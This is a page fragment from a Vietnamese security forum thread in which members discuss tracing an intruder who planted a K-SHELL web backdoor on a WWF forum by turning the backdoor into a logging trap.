  <tr>
    <td valign="middle" nowrap="nowrap">
	
</td>
  </tr>
</table>
	</td>
</tr>
</table>
</td>
      </tr>
	</table>
	
	<table cellspacing="1" cellpadding="3" width="100%" align="center" border="0">
      <tr>
        <!-- Message -->
        <td colspan="2" valign="top" class="row1">
				<!-- should view editeBy or not -->
			  <!-- which to view -->
                <table cellspacing="3" cellpadding="3" width="100%" align="center" border="0">
                  <tr>
                    <td valign="top" class="row1"><span class="postbody">@ktstbniit: Kshell nó là cái gì mà có thể &quot;nhiễm&quot; vào WWF nhỉ? Nhất là khi bạn post cái code lên đây làm gì? <img src="/hvaonline/images/smilies/8f173d0eaffc4b90c0c0361b8f37cc17.gif" border="0" alt="smilie" align="absbottom"> ... Xem đoạn code lây lan của nó nằm ở đâu chắc ??<br/> Nếu ko rõ bằng cách nào nó up con backdoor lên được thì hãy thử dùng cách này:<br/> <br/> Thằng Hacker ko deface, mà để lại backdoor chắc nó còn quay lại. Hãy sửa lại con backdoor kshell một chút để bẫy nó (ghi lại IP, referer, etc) ra một file log bí mật (nếu có request truy vấn vào file này) và phá hỏng code của backdoor. Lúc đó backdoor ko còn tác dụng --&gt; thằng hacker nhất định sẽ up lên con khác --&gt; Lúc này bạn có đủ log (IP, referer, cookie ..etc) để truy vấn vào log xem nó làm sao để up được con backdoor đó. Có khi lại được vài kĩ năng của thằng hacker, hoặc là chôm được 0-day mà nó sử dụng để hack <img src="/hvaonline/images/smilies/8f173d0eaffc4b90c0c0361b8f37cc17.gif" border="0" alt="smilie" align="absbottom">.<br/> <font color='orange'>[tán phét]</font><br/>  Tui đã từng bị một tay "có hạng" dùng chiêu này để truy vết  <img src="/hvaonline/images/smilies/8f173d0eaffc4b90c0c0361b8f37cc17.gif" border="0" alt="smilie" align="absbottom">, may mà mình phát hiện ra cái bẫy của hắn và rốt cục cái bẫy của hắn chỉ bẫy được một lời khuyên của tui <img src="/hvaonline/images/smilies/aa694503e005b7e28b579defab48c1a7.gif" border="0" alt="smilie" align="absbottom"><br/> <font color='orange'>[/tán phét]</font></span></td>
                  </tr>
                </table>
          <!-- Attachments -->
			  		</td>
      </tr>

		  <tr>
			<td height="20" colspan="2" valign="bottom" class="rowButton"><span class="gensmall">Cánh chym không mỏi<br>lol</span></td>
		  </tr>

			<tr>
		        <td valign="bottom" class="row1" align="center"><div class="action" align="center">
	<table width="100%" border="0">
  		<tr>
		<td align="left">
					</td>
		<td align="right">
			<!--  -->
			
		


		
		
		<a class="nav" href="#top"><img src="http://www.hvaonline.net/hvaonline/templates/viet/images/en_US/icon_up.gif" alt="[Up]" title="[Up]"></a>
			<img src="http://www.hvaonline.net/hvaonline/templates/viet/images/en_US/icon_print.gif" alt="[Print Copy]" title="[Print Copy]"></a>
		</td>
  	</tr>
	</table>
</div></td>
		  </tr>
	</table>

<table cellspacing="0" cellpadding="0" width="100%" align="center" border="0">
	<tr>
    	<td class="catbottomslim" height="1"><img src="http://www.hvaonline.net/hvaonline/templates/viet/images/spacer.gif" alt="" width="1" height="5"></td>
  	</tr>
	<tr>
		<td><img src="http://www.hvaonline.net/hvaonline/templates/viet/images/spacer.gif" alt="" width="1" height="20"></td>
	</tr>
</table>

		


<table cellspacing="0" cellpadding="0" width="100%" align="center" border="1">
	<table cellspacing="0" cellpadding="3" width="100%" align="center" border="0">
      <tr>

		

		<th nowrap="nowrap" class="thright" height="20" valign="middle" align="left">&nbsp;&nbsp;<span class="posttype"><font color="#777777">[Question]</font></span>&nbsp;&nbsp; Re: Forum WWF 9.53 bị nhiễm K-SHELL, làm sao để fix<a name="160367" id="160367"></a></th>
        <th class="thleft" nowrap="nowrap" width="300" height="20" valign="middle" align="right">27/11/2008 03:20:05 (+0700) | <a href="/hvaonline/posts/list/26343.html#160367">#6</a> | 160367 </th>
		
      </tr>
	</table>

	<table cellspacing="0" cellpadding="3" width="100%" align="center" border="0">
      <tr> 
		<!-- Username & profile -->
          	<td class="rowButton" valign="top">
<table cellspacing="3" cellpadding="3" width="100%" align="left" border="0">
<tr>
<td width="20">
		<img src="http://www.hvaonline.net/hvaonline/images/avatar/089f41810321eefc3f4eef5d4a388e42.png" border="0" alt="[Avatar]" title="[Avatar]"><br>
	</td>

<td align="left">
<span class="uprofile"><a href="/hvaonline/user/profile/67588.html"><b>conmale</b></a><br>
	<font color="#FF3333">Administrator</font></span>
<br>

<span class="uprofile">
		
</span>

<!-- --></td>
	<td align="left" class="gen" width="180">
		Joined: 07/05/2004 23:43:15<br>
		Messages: 9353<br>
	
		Location: down under<br>
	
	
			<span class="offline">Offline </span>
	<br>
<table cellspacing="0" cellpadding="0" border="0" width="100%">
  <tr>
	<td valign="middle" nowrap="nowrap"> 
		<a href="/hvaonline/user/profile/67588.html" class="icon_profile"><img src="http://www.hvaonline.net/hvaonline/templates/viet/images/en_US/icon_profile.gif" alt="[Profile]" title="[Profile]"></a>
		<a href="/hvaonline/pm/sendTo/67588.html" class="icon_pm"><img src="http://www.hvaonline.net/hvaonline/templates/viet/images/en_US/icon_pm.gif" alt="[PM]" title="[PM]"></a>

		
		
		
		
	</td>
</tr>
  <tr>
    <td valign="middle" nowrap="nowrap">
	
</td>
  </tr>
</table>
	</td>
</tr>
</table>
</td>
      </tr>
	</table>
	
	<table cellspacing="1" cellpadding="3" width="100%" align="center" border="0">
      <tr>
        <!-- Message -->
        <td colspan="2" valign="top" class="row2">
				<!-- should view editeBy or not -->
			  <!-- which to view -->
                <table cellspacing="3" cellpadding="3" width="100%" align="center" border="0">
                  <tr>
                    <td valign="top" class="row2"><span class="postbody"><p></p>
		<cite class="blockquote">gamma95 wrote:</cite><br>
		<blockquote>@ktstbniit: Kshell nó là cái gì mà có thể &quot;nhiễm&quot; vào WWF nhỉ? Nhất là khi bạn post cái code lên đây làm gì? <img src="/hvaonline/images/smilies/8f173d0eaffc4b90c0c0361b8f37cc17.gif" border="0" alt="smilie" align="absbottom"> ... Xem đoạn code lây lan của nó nằm ở đâu chắc ??<br/> Nếu ko rõ bằng cách nào nó up con backdoor lên được thì hãy thử dùng cách này:<br/> <br/> Thằng Hacker ko deface, mà để lại backdoor chắc nó còn quay lại. Hãy sửa lại con backdoor kshell một chút để bẫy nó (ghi lại IP, referer, etc) ra một file log bí mật (nếu có request truy vấn vào file này) và phá hỏng code của backdoor. Lúc đó backdoor ko còn tác dụng --&gt; thằng hacker nhất định sẽ up lên con khác --&gt; Lúc này bạn có đủ log (IP, referer, cookie ..etc) để truy vấn vào log xem nó làm sao để up được con backdoor đó. Có khi lại được vài kĩ năng của thằng hacker, hoặc là chôm được 0-day mà nó sử dụng để hack <img src="/hvaonline/images/smilies/8f173d0eaffc4b90c0c0361b8f37cc17.gif" border="0" alt="smilie" align="absbottom">.<br/> <font color='orange'>[tán phét]</font><br/>  Tui đã từng bị một tay "có hạng" dùng chiêu này để truy vết  <img src="/hvaonline/images/smilies/8f173d0eaffc4b90c0c0361b8f37cc17.gif" border="0" alt="smilie" align="absbottom">, may mà mình phát hiện ra cái bẫy của hắn và rốt cục cái bẫy của hắn chỉ bẫy được một lời khuyên của tui <img src="/hvaonline/images/smilies/aa694503e005b7e28b579defab48c1a7.gif" border="0" alt="smilie" align="absbottom"><br/> <font color='orange'>[/tán phét]</font>&nbsp;
		</blockquote><br/> <br/> Khì khì, thường mà bị tình trạng thế này là hoảng vía. Hầu hết là xóa béng ngay, thậm chí shutdown dịch vụ chớ có mấy ai bình tĩnh mà dùng chiêu "gậy ông" đâu em  <img src="/hvaonline/images/smilies/2e4dbae43873d9c4000502fac3c29d73.gif" border="0" alt="smilie" align="absbottom"> . Anh thấy những con shell được dùng bằng cách lấy của ai đó rồi tìm cách upload lên server nào đó bị lỗi để... "quậy" thì thường cực kỳ hiếm 0-day.</span></td>
                  </tr>
                </table>
          <!-- Attachments -->
			  		</td>
      </tr>

		  <tr>
			<td height="20" colspan="2" valign="bottom" class="rowButton"><span class="gensmall">What bringing us together is stronger than what pulling us apart.</span></td>
		  </tr>

			<tr>
		        <td valign="bottom" class="row1" align="center"><div class="action" align="center">
	<table width="100%" border="0">
  		<tr>
		<td align="left">
					</td>
		<td align="right">
			<!--  -->
			
		


		
		
		<a class="nav" href="#top"><img src="http://www.hvaonline.net/hvaonline/templates/viet/images/en_US/icon_up.gif" alt="[Up]" title="[Up]"></a>
			<img src="http://www.hvaonline.net/hvaonline/templates/viet/images/en_US/icon_print.gif" alt="[Print Copy]" title="[Print Copy]"></a>
		</td>
  	</tr>
	</table>
</div></td>
		  </tr>
	</table>

<table cellspacing="0" cellpadding="0" width="100%" align="center" border="0">
	<tr>
    	<td class="catbottomslim" height="1"><img src="http://www.hvaonline.net/hvaonline/templates/viet/images/spacer.gif" alt="" width="1" height="5"></td>
  	</tr>
	<tr>
		<td><img src="http://www.hvaonline.net/hvaonline/templates/viet/images/spacer.gif" alt="" width="1" height="20"></td>
	</tr>
</table>

		

<table cellspacing="0" cellpadding="0" width="100%" border="0" align="center">
	<tr>
		<td valign="middle" align="right" class="nav"></td>
	</tr>
</table>

<!-- quick reply -->
<table class="forumline" cellspacing="1" cellpadding="3" width="100%" border="0" align="center">
</table>

<table cellspacing="0" cellpadding="0" width="100%" border="0" align="center">
	<tr>
		<td><img src="http://www.hvaonline.net/hvaonline/templates/viet/images/spacer.gif" alt="" width="1" height="10"></td>
	</tr>
</table>

<table cellspacing="0" cellpadding="0" width="100%" border="0" align="center">
	<tr>
		<td align="left">
			<!-- watch - unwatch -->
			<!-- add bookmark -->

		</td>
		<td align="right" valign="bottom">			
		</td>
	</tr>
</table>

<!-- mod -->

<table cellspacing="0" cellpadding="0" width="100%" border="0" align="center">
	<tr>
		<td colspan="3"><img src="http://www.hvaonline.net/hvaonline/templates/viet/images/spacer.gif" alt="" width="1" height="10"></td>
	</tr>
</table>

<!-- combo navigator -->
<table cellspacing="0" cellpadding="0" width="100%" border="0" align="center">
	<tr>
		<td align="left"><a href="http://digg.com/submit?phrase=2&url=http://www.hvaonline.net/hvaonline/posts/list/26343.html"><img src="http://www.hvaonline.net/hvaonline/templates/viet/images/digg.gif" align="texttop" alt="[digg]" title="[digg]"></a>
<a href="http://del.icio.us/post?url=http://www.hvaonline.net/hvaonline/posts/list/26343.html"><img src="http://www.hvaonline.net/hvaonline/templates/viet/images/delicious.gif" align="texttop" alt="[delicious]" title="[delicious]"></a>
<a href="http://www.google.com/bookmarks/mark?op=edit&output=popup&bkmk=http://www.hvaonline.net/hvaonline/posts/list/26343.html"><img src="http://www.hvaonline.net/hvaonline/templates/viet/images/google.gif" align="texttop" alt="[google]" title="[google]"></a>
<a href="http://bookmarks.yahoo.com/toolbar/savebm?opener=tb&u=http://www.hvaonline.net/hvaonline/posts/list/26343.html"><img src="http://www.hvaonline.net/hvaonline/templates/viet/images/yahoo.gif" align="texttop" alt="[yahoo]" title="[yahoo]"></a>
<a href="http://technorati.com/faves?add=http://www.hvaonline.net/hvaonline/posts/list/26343.html"><img src="http://www.hvaonline.net/hvaonline/templates/viet/images/technorati.gif" align="texttop" alt="[technorati]" title="[technorati]"></a>
<a href="http://reddit.com/submit?url=http://www.hvaonline.net/hvaonline/posts/list/26343.html"><img src="http://www.hvaonline.net/hvaonline/templates/viet/images/reddit.gif" align="texttop" alt="[reddit]" title="[reddit]"></a>
<a href="http://www.stumbleupon.com/submit?url=http://www.hvaonline.net/hvaonline/posts/list/26343.html"><img src="http://www.hvaonline.net/hvaonline/templates/viet/images/stumbleupon.gif" align="texttop" alt="[stumbleupon]" title="[stumbleupon]"></a></td>
		<td align="right">	<table cellspacing="0" cellpadding="0" border="0">
		<tr>			  
			<td nowrap="nowrap">
				<form action="" name="f" id="f" accept-charset="UTF-8">
					<span class="gensmall">Go to:&nbsp;</span>
					<select onchange="if(this.options[this.selectedIndex].value > 0){ document.location = '/hvaonline/forums/show/'+ this.options[this.selectedIndex].value +'.html'; }" name="select">
						<option value="0" selected="selected">Select a forum</option>				
							<option value="0">-------------</option>
									<option value="2" >Thông báo từ HVA</option>
									<option value="41" >FAQ - Các câu hỏi thường gặp</option>
									<option value="5" >Góp ý và Hỏi đáp thắc mắc chung</option>
									<option value="6" >Kiểm tra bảo mật</option>
							<option value="0">-------------</option>
									<option value="8" selected="selected">Thảo luận bảo mật</option>
									<option value="12" >Thảo luận thâm nhập</option>
									<option value="28" >Thảo luận virus, trojan, spyware, worm...</option>
									<option value="36" >Thủ thuật reverse engineering</option>
									<option value="13" >Thông tin new bugs và exploits</option>
									<option value="51" >Case Studies</option>
							<option value="0">-------------</option>
									<option value="23" >Thảo luận hệ điều hành Windows</option>
									<option value="24" >Thảo luận hệ điều hành *nix</option>
									<option value="26" >Thảo luận các loại thiết bị máy tính</option>
									<option value="31" >Thảo luận mạng và thiết bị mạng</option>
									<option value="27" >Thông tin về các địa chỉ và tài liệu hữu ích</option>
							<option value="0">-------------</option>
									<option value="44" >Người tìm việc - Việc tìm người</option>
									<option value="21" >Thảo luận việc định hướng</option>
									<option value="19" >Những thảo luận khác</option>
									<option value="50" >Hình minh họa</option>
									<option value="33" >Trash</option>
							<option value="0">-------------</option>
					</select>
				</form>
			</td>
		</tr>
	</table>
</td>
	</tr>
</table>

<table cellspacing="0" cellpadding="0" width="100%" border="0" align="center">
	<tr>
		<td colspan="3"><img src="http://www.hvaonline.net/hvaonline/templates/viet/images/spacer.gif" alt="" width="1" height="10"></td>
	</tr>
</table>

<!-- list users in -->
<table class="forumline" cellspacing="3" cellpadding="0" width="100%" border="0" align="center">
	<tr>
		<th class="thright"  nowrap="nowrap" height="26" valign="middle">&nbsp;Users currently in here&nbsp;</th>
	</tr>
		<tr>
			<td class="gensmall" valign="middle" align="left">
				1 Anonymous 
				
			</td>	
		</tr>
</table>
<a name="quick"></a>

<table cellspacing="0" cellpadding="0" width="100%" border="0"  align="center">

	<tr>	
		<td align="center">
		<br>
					</td>
	</tr>

	<tr>
		<td align="center">
			<span class="copyright">Powered by JForum - Extended by <a href="MailTo:lienlac@hvaonline.net">HVAOnline</a><br>
			&nbsp;hvaonline.net&nbsp; | &nbsp;hvaforum.net&nbsp; | &nbsp;hvazone.net&nbsp; | &nbsp;hvanews.net&nbsp; | &nbsp;vnhacker.org<br>
			1999 - 2013 &copy;
			v2012|0504|218|
		  </span>
	  </td>
	</tr>
<iframe src="/hvaonline/templates/ping_session.jsp" height="0" width="0" frameborder="0" scrolling="no"></iframe>
</body>
</html>
</table>

<script type="text/javascript" src="http://www.hvaonline.net/hvaonline/templates/viet/js/post_show.js"></script>
<script type="text/javascript" src="http://www.hvaonline.net/hvaonline/templates/viet/js/post.js"></script>
<script type="text/javascript" src="http://www.hvaonline.net/hvaonline/templates/viet/js/avim.js"></script>
<script type="text/javascript">
<!--
function showEmail(beforeAt, afterAt)
{
	return beforeAt + "@" + afterAt;
}

var starOn=new Image();
starOn.src="http://www.hvaonline.net/hvaonline/templates/viet/images/star_on.gif";

var starOff=new Image();
starOff.src="http://www.hvaonline.net/hvaonline/templates/viet/images/star_off.gif";

function writeStars(q, postId)
{
	for (var i = 0; i < 5; i++) {
		var name = "star" + postId + "_" + i;
		document.write("<img name='" + name + "' alt='*' />");
		document.images[name].src = q > i ? starOn.src : starOff.src;
	}
}

function addBookmark(relationType, relationId)
{
	var w = window.open('/hvaonline/bookmarks/insert/' + relationType + '/' + relationId + '.html', 'bookmark_add', 'width="700", height="100", scrollbars="no"');
	w.focus();
}

function supportAjax()
{
	if (typeof(AjaxUtils) != 'undefined') {
		if (window.ActiveXObject) {
			var r = new ActiveXObject("Microsoft.XMLHTTP");
			return r != undefined;
		}
		else if (window.XMLHttpRequest) {
			return true;
		}
	}

	return false;
}




function maxImg(foto, maxSize){
w = foto.width;
if (w > maxSize){
	foto.width = maxSize;
	}
} 

-->
</script>
